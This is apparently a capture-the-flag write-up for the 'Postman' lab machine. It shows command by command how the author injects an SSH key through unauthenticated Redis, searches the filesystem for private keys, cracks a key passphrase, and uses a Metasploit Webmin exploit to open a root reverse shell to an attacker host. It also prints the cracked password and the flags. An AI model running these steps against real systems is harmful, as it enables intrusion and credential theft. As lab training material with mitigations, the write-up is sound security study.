# Machine Information

| IP Address           | 10.129.2.1    |
| -------------------- | ------------- |
| **Operating System** | Linux         |
| **Hostname**         | Postman       |
| **Domain**           | WORKGROUP     |
| **Release Date**     | November 2019 |
| **Difficulty**       | Easy          |

---
# Machine Description

Postman is an Easy-level Linux machine that demonstrates the risks of insecure default configurations in popular services. The machine features an open Redis instance with anonymous access, an outdated Webmin installation vulnerable to authenticated remote code execution, and weak credential management practices. The exploitation chain progresses from leveraging Redis to inject SSH keys, cracking encrypted private keys, and finally exploiting a known vulnerability in Webmin to achieve root access.

---

# Exploitation Summary

The attack chain involved:

1. **Service Enumeration**: Discovering open ports including Redis and Webmin
2. **Redis Exploitation**: Leveraging anonymous Redis access to inject SSH public keys into the authorized_keys file
3. **Lateral Movement**: Gaining shell access as the redis user
4. **Credential Cracking**: Extracting and cracking an encrypted SSH private key belonging to the Matt user
5. **User Access**: Using cracked credentials to access the user account and retrieve the user flag
6. **Webmin Authentication**: Using the same cracked credentials to authenticate to Webmin
7. **CVE-2019-12840 Exploitation**: Exploiting a package upload vulnerability in Webmin 1.910 to achieve remote code execution as root
8. **Root Access**: Executing commands as the root user and retrieving the root flag

---

# Detailed Walkthrough

## Road to User Flag

##### ***Phase 1: Initial Reconnaissance and Service Discovery***

I began by scanning the target machine with Nmap to identify open ports and running services:

```
$ nmap 10.129.2.1 -Pn -sV

...SNIP...

PORT      STATE SERVICE VERSION  
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))  
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  

...SNIP...
```

To ensure comprehensive coverage, I performed a full port scan to discover any additional services:

```
$ nmap 10.129.2.1 -Pn -p- --open -T5

...SNIP...

6379/tcp  open  redis 

...SNIP...
```
##### ***Phase 2: Web Application Analysis***

I accessed the Webmin interface on port 10000 and discovered a login form requiring username and password credentials. 

![[Pasted image 20261003093822.png]]

After intercepting the login request with Burp Suite, I identified POST parameters for both username and password fields. 

![[Pasted image 20261010090839.png]]

Suspecting potential SQL injection vulnerabilities, I saved the request as a text file and tested the login form using SQLMap:

```
sqlmap -r req.txt
```

However, the testing revealed that the login form parameters were not vulnerable to SQL injection techniques. This necessitated exploring alternative attack vectors.

##### ***Phase 3: Redis Service Exploitation***

With the Webmin login remaining inaccessible through direct exploitation, I shifted focus to the Redis service discovered on port 6379. Redis is a popular in-memory data store, but when improperly configured without authentication, it can become a critical security vulnerability. I connected to the Redis instance to verify anonymous access:

```
redis-cli -h 10.129.2.1
10.129.2.1:6379>
```

The Redis server responded to unauthenticated connections, confirming that no password protection was enabled. Redis stores data in a key-value format and can persist data to disk in RDB (Redis Database) format. This functionality, combined with the ability to configure the persistence directory, creates an opportunity to write arbitrary files to the file system. I generated a new SSH key pair for the attack:

```
ssh-keygen -t rsa -f redis_key
```

The generated public key needed to be formatted with newlines to account for potential RDB file corruption:

```
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > key.txt
```

I then loaded this formatted public key into Redis as a key-value pair:

```
cat key.txt | redis-cli -h 10.129.2.1 -x set ssh_key
```

Next, I configured Redis to save its database to a file named `authorized_keys` in the `redis` users's home directory, which i supposed to be `/var/lib/redis`:

```
$ redis-cli -h 10.129.2.1
10.129.2.1:6379> config set dir /var/lib/redis/.ssh
OK
10.129.2.1:6379> config set dbfilename "authorized_keys"
OK
10.129.2.1:6379> save
OK
```

The `save` command persisted the Redis database to disk. The RDB format would include the SSH key data I had stored, effectively writing my public key to `/var/lib/redis/.ssh/authorized_keys`. Although RDB files contain binary data and formatting overhead, the newlines surrounding my public key data ensured that the key remained in a parseable format within the file.

##### ***Phase 4: SSH Access as Redis User***

With the public key now present in the `redis` user's home directory, I attempted to authenticate via SSH using the corresponding private key:

```
ssh -i redis_key redis@10.129.2.1
```

The connection succeeded, granting me shell access as the redis user. I verified my access:

```
redis@Postman:~$ id
uid=107(redis) gid=114(redis) groups=114(redis)
```

##### ***Phase 5: Reconnaissance and Private Key Discovery***

From my position as the redis user, I began enumerating the system to identify paths for privilege escalation. I searched for other users on the system:

```
redis@Postman:~$ ls /home
Matt
```

I identified that another user named `Matt` existed on the system. Enumerating his home directory, I found the user flag but lacked permission to read it:

```
redis@Postman:$ ls -ltra /home/Matt/user.txt

...SNIP...

-rw-rw---- 1 Matt Matt 33 Oct  4 07:36 user.txt

...SNIP...
```

I then conducted a comprehensive search for SSH private keys stored on the system:

```
redis@Postman:~$ grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
/opt/id_rsa.bak:1:-----BEGIN RSA PRIVATE KEY-----
```

I discovered an encrypted RSA private key belonging to Matt stored in `/opt/id_rsa.bak`. The file had readable permissions:

```
redis@Postman:~$ ls -l /opt/id_rsa.bak
-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak
```

I extracted and examined the key, which is encrypted and protected by a passphrase:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

...SNIP...

-----END RSA PRIVATE KEY-----
```

##### ***Phase 6: SSH Key Passphrase Cracking***

To crack the passphrase protecting the private key, I transferred the key to my attack machine and converted it to a hashable format using `ssh2john`:

```
ssh2john id_rsa.bak > id_rsa.hash
```

I then used John the Ripper to crack the hash against the `rockyou.txt` wordlist:

```
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

...SNIP...

computer2008     (Matt_id_rsa.txt)

...SNIP...
```

The cracking process succeeded rapidly, revealing the passphrase `computer2008`

##### ***Phase 7: Lateral Movement to Matt User***

After obtaining the passphrase to use the private key, I attempted to access the SSH service as Matt, but the server blocked the connection. So, I leveraged the cracked passphrase to switch user context directly on the target system. From my redis shell, I executed the su command with username `Matt` and password `computer2008`:

```
redis@Postman:~$ su Matt
```

After successful authentication, I navigated to `Matt`'s home directory and retrieved the user flag:

```
Matt@Postman:~$ cat /home/Matt/user.txt
```

==User flag==: `c7796dd40102f7f0a01935d1868260d6`

## Road to Root Flag

##### ***Phase 1: Webmin Authentication***

Having obtained valid credentials (`Matt: computer2008`), I attempted to authenticate to the Webmin interface on port 10000. Webmin presented a login form, and I entered the discovered credentials. The authentication succeeded, granting me access to the Webmin administrative dashboard. This represented a significant privilege escalation opportunity, as Webmin runs with elevated privileges and interacts directly with system configuration.

![[Pasted image 20261004131413.png]]

##### ***Phase 2: Webmin vulnerable version

Upon accessing Webmin, I noted the version displayed as 1.910. This version is known to be vulnerable to CVE-2019-12840, a package upload vulnerability that permits remote code execution. The vulnerability exists in the package management module, specifically in the processing of uploaded packages. I configured the Metasploit framework to exploit this vulnerability:

```
use exploit/linux/http/webmin_packageup_rce
set username Matt
set password computer2008
set rhost 10.129.2.1
set lhost 10.10.14.102
set lport 4444
```

This first attempt failed with the error "Failed to retrieve session cookie." The Webmin interface on the target system was communicating over HTTPS rather than HTTP. I corrected the exploit configuration:

```
set ssl true
```

After enabling SSL, I executed the exploit:

```
run
```

The exploit successfully retrieved the session cookie and initiated the payload delivery. The vulnerability allows arbitrary command execution through the package upload functionality. The exploit uploaded a malicious payload that executed a reverse shell connection back to my attack machine:

```
[+] Session cookie: 1937f4de8036b5e526bc6ec964f4b81d
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.14.102:4444 -> 10.129.2.1:51642)
```

##### ***Phase 3: Get the flag***

Upon successful exploitation, I obtained a shell with root privileges:

```
id
uid=0(root) gid=0(root) groups=0(root)
```

With root access confirmed, I located the flag in  and retrieved the root flag:

```
locate root.txt
/root/root.txt
```

```
cat /root/root.txt
```

==Root flag==: `af4b49fe6ba1972f5964b5d657b6557f`

---

# Key Vulnerabilities Exploited

- **Unauthenticated Redis Access**: The Redis service on port 6379 was configured to accept connections without authentication. This allowed arbitrary manipulation of in-memory data and the critical ability to write data to the file system through the SAVE command and configurable persistence settings.
- **Predictable SSH Directory Structure**: The Redis user's home directory followed the standard Linux convention of `/var/lib/redis`. The `.ssh` subdirectory could be created implicitly through Redis operations, allowing placement of SSH public keys in the authorized_keys file without prior directory creation.
- **Encrypted Private Key Storage**: The private key for user Matt was stored in a world-readable location (`/opt/id_rsa.bak`) with weak passphrase protection. The passphrase "computer2008" was found in standard wordlists, indicating poor password selection practices.
- **Credential Reuse**: The passphrase used to protect the SSH private key was identical to the password used for the Matt user account. This represents a significant security practice violation, as compromise of one credential immediately compromises both.
- **Webmin CVE-2019-12840**: Webmin 1.910 contains a package upload vulnerability that permits authenticated remote code execution. An attacker with valid credentials can upload a malicious package that executes arbitrary commands with Webmin's privileges (typically root).
- **Outdated Software Version**: The Webmin installation had not been updated from version 1.910, released in 2019. This outdated version lacked security patches for known vulnerabilities.

---

# Conclusion

The Postman machine demonstrates how multiple misconfigurations combine to enable complete system compromise. From anonymous Redis access enabling SSH key injection, to credential cracking and finally authenticated vulnerability exploitation, each stage exploited the previous vulnerability. This emphasizes the importance of secure service configuration, proper access controls, strong password policies, and timely software updates. To mitigate these vulnerabilities, organizations should disable anonymous access to all services like Redis by implementing strong authentication and network segmentation. SSH private keys should never be stored in world-readable locations and should be protected with strong, unique passphrases never reused as user account passwords. Systems should maintain strict password complexity policies and enforce regular password rotation to prevent dictionary attacks. Software must be kept current with security patches, particularly for services like Webmin that operate with elevated privileges. Regular security audits should identify outdated or vulnerable service versions before attackers can exploit them. This case study underscores that Linux security requires defense in depth, as layered misconfigurations create an irresistible attack surface.
